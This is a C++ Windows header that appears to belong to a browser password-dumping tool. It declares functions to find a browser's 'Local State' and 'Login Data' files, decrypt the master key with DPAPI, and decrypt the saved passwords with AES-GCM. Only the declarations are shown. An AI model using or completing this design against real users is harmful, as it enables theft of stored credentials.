#pragma once

#ifdef _WIN32

#include <Windows.h>
#include <Shlobj.h>
#include <string>
#include <nlohmann/json.hpp>
#include <locale>
#include <codecvt>
#include <sqlite3.h>
#include <sodium.h>
#include <vector>
#include <fstream>
#include <wincrypt.h>

// Link against the required libraries
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Shell32.lib")

//using namespace std;
using json = nlohmann::json;

#define MAX_LINE_LENGTH 1024
#define IV_SIZE 12

#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

// Finds the path to the Local State file.
// @return The path to the Local State file as a wide string.
std::wstring FindLocalState();

// Finds the path to the Login Data file.
// @return The path to the Login Data file as a wide string.
std::wstring FindLoginData();

// Retrieves the encrypted key from the Local State file.
// @param localStatePath The path to the Local State file.
// @return The encrypted key as a string.
std::string getEncryptedKey(const std::wstring& localStatePath);

// Parses the Login Data file to extract login credentials.
// @param loginDataPath The path to the Login Data file.
// @param decryptionKey The key used to decrypt the login data.
// @return An integer indicating success (0) or failure (non-zero).
int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey);

// Decrypts an encrypted key.
// @param encrypted_key The encrypted key as a string.
// @return The decrypted key as a DATA_BLOB structure.
DATA_BLOB decryptKey(const std::string encrypted_key);

// Decrypts a password using the provided key and initialization vector (IV).
// @param ciphertext The encrypted password.
// @param ciphertext_len The length of the encrypted password.
// @param key The key used for decryption.
// @param iv The initialization vector used for decryption.
// @param decrypted The buffer to store the decrypted password.
void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);


#endif // _WIN32
